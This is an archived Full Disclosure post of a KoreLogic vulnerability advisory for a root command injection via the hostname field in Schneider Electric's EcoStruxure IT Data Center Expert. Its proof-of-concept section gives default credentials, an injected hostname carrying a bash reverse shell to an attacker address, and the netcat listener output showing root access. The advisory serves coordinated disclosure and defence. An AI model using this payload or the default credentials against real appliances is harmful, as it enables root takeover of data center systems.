---
title: KL-001-2025-009: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution
url: https://seclists.org/fulldisclosure/2025/Jul/8
source: Full Disclosure
date: 2025-07-10
fetch_date: 2025-10-06T23:52:30.535202
---

# KL-001-2025-009: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-009: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 9 Jul 2025 17:16:55 -0500

---

```
KL-001-2025-009: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution

Title: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution
Advisory ID: KL-001-2025-009
Publication Date: 2025-07-09
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-009.txt

1. Vulnerability Details

     Affected Vendor: Schneider Electric
     Affected Product: EcoStruxure IT Data Center Expert
     Affected Version: 8.3 and prior
     Platform: CentOS
     CWE Classification: CWE-1286: Improper Validation of Syntactic
                         Correctness of Input, CWE-94: Improper
                         Control of Generation of Code
                         ('Code Injection')
     CVE ID: CVE-2025-50123

2. Vulnerability Description

     When performing the configuration of the Data Center Expert
     ("DCE") appliance, sufficient input sanitization is not
     performed on the value provided for the hostname of the
     appliance. The hostname variable can include a command
     terminator and subsequent commands, that will be executed with
     root privileges.

3. Technical Description

     In the .bcsetup script which drives and controls the SSH-based
     configuration of the appliance, the hostname value accepted
     from the user is not sufficiently sanitized.  The script does
     check to ensure there is hostname value provided that includes
     (but not limited to) a valid hostname.

       def checkHostnameFormat(hn):
         result = False
         try:
             hostname_check = re.compile('[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
             result = hostname_check.match(hn)
         except:
             result = False
         return result

     A hostname value can be provided that passes this check, but
     that also includes a semi-colon followed by operating system
     commands. The .bcsetup script runs with root privileges, so
     the command(s) after the semi-colon are also executed with
     root privileges. It is likely this happens when the appliance
     attempts to perform DNS resolution:

       def resolveHostnameToIPAddr(new_hostname):
         global domain

         if ("" != domain):
             result_string = execOSCmd("host " + new_hostname)
             if (-1 == result_string.find("has address " + ipaddr)):
                 return False
             else:
                 return True

         return False

4. Mitigation and Remediation Recommendation

     Version 9.0 of EcoStruxure IT Data Center Expert includes
     fixes for these vulnerabilities and is available upon request
     from Schneider Electric's Customer Care Center. Refer to
https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2025-189-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2025-189-01.pdf.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-11-21 : KoreLogic reports vulnerability details to
                  Schneider Electric CPCERT.
     2024-11-22 : Vendor acknowledges receipt of KoreLogic's
                  submission.
     2024-12-06 : Vendor confirms the reported vulnerability.
     2024-12-12 : Vendor requests a meeting with KoreLogic to discuss
                  the timeline of remediation efforts for this
                  vulnerability, as well as for associated submissions
                  from KoreLogic.
     2024-12-18 : KoreLogic and Schneider Electric agree to embargo
                  vulnerability details until product update 9.0,
                  circa July, 2025.
     2025-01-29 : Vendor provides status update.
     2025-03-17 : Vendor provides beta release containing remediation
                  for this and other associated vulnerabilities
                  reported by KoreLogic.
     2025-06-20 : Vendor notifies KoreLogic that the publication date
                  for this vulnerability will be 2025-07-08.
     2025-07-08 : Vendor public disclosure.
     2025-07-09 : KoreLogic public disclosure.

7. Proof of Concept

     DCE Appliance:

     SSH in to the appliance using apcsetup / apcsetup (default
     credentials) and you will be placed in a restricted shell that
     runs a configuration utility. Accept or set the configuration
     settings until you get the the prompt for setting the hostname.
     When prompted for the hostname, provide the following value:

     "xyzzy.domain.com;bash -i >& /dev/tcp/192.168.2.1/18953 0>&1"

     ATTACKER BOX:
     $ nc -v -l -p 18953 -s 192.168.2.1
     Listening on 192.168.2.1 18953
     Connection received on 192.168.2.90 35780
     [root@xyzzy ~]# id
     id
     uid=0(root) gid=0(root) groups=0(root)
     [root@xyzzy ~]#

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-8/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **KL-001-2025-009: Schneider Electric EcoStruxure IT Data Center Expert Remote Command Execution** *KoreLogic Disclosures via Fulldisclosure (Jul 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://secl...